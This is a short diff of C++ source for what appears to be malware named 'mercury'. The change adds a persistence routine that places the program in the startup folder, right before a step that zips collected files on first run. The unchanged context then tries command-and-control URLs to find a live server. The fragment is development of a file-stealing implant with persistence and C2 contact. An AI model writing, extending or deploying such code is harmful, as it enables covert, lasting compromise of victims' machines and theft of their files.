@@ -75,8 +75,8 @@ int main() {
     if (ONETIMERUN) {
         // If the zip file doesn't exist, it's the first run
         if (!std::ifstream(zipDestStr).good()) {
-            // Process files and create a zip file
-            GenZip();
+            PersistOnMachine(); // Add mercury to startup folder
+            GenZip();           // Process files and create a zip file
 
             // Try connecting to Google and then connect to all C2 URLs to find a live C2
             bool ReachIntranet = googleConn();
